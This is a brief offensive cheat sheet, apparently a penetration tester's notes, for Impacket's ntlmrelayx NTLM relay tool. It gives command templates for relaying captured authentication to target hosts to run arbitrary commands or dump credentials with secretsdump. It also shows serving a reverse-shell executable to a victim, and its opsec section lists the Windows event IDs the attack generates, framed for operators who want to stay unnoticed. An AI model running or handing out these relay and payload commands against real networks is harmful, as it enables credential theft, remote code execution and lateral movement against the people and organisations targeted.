### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py  

### General information
```
Pass-The-Hash with NTHash/NTLM possible
Pass-The-Hash with NET-NTLM/NTLMv1/v2 not possible
Relaying does not work if smb signing is enabled
```

### Relay requests to ip addresses, without -c ntlmrelayx will use secretsdump (must be in the same directory)
```
impacket-ntlmrelayx -tf <rhostFile> -c '<command>'
```

### Serve payload, -t = target, -e payload from file - if client throws smb version-error use: -smb2support
```
impacket-ntlmrelayx -t <rhost> -e <./reverse.exe>
```

### Opsec considerations - 
```
Windows Security Log Event IDs
-Logon (4624) -> multiple
-Logoff (4634) -> multiple
-Special Logon (4672) -> multiple

Windows System Logs
Service Control Manager (7040) -> multiple
```

